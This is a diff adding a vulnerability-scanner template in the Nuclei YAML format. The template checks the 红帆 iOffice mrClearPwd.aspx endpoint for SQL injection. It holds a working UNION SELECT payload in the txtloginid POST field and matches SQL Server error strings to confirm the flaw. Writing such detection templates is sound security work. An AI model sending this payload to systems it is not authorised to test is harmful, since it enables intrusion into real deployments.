@@ -1,0 +1,46 @@
+id: poc-yaml-hongfan-ioffice-mrclearpwd-aspx-sqli
+info:
+  name: 红帆ioffice mrClearPwd.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the '红帆ioffice' application on the 'mrClearPwd.aspx' endpoint.
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - raw:
+      - |
+        GET /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: regex
+        regex:
+          - "name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\""
+    extractors:
+      - type: regex
+        name: VIEWSTATE
+        internal: true
+        regex:
+          - "name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(?P<VIEWSTATE>.*?)\""
+  - raw:
+      - |
+        POST /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={{VIEWSTATE}}&__VIEWSTATEGENERATOR=6EE6100A&txtloginid=-1'+UNION+SELECT+sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--+&grop1=rad2&txtmobileNO=1&txtmobile=13888888888&ok=%E7%A1%AE%E3%80%80%E8%AE%A4
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "iOffice"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
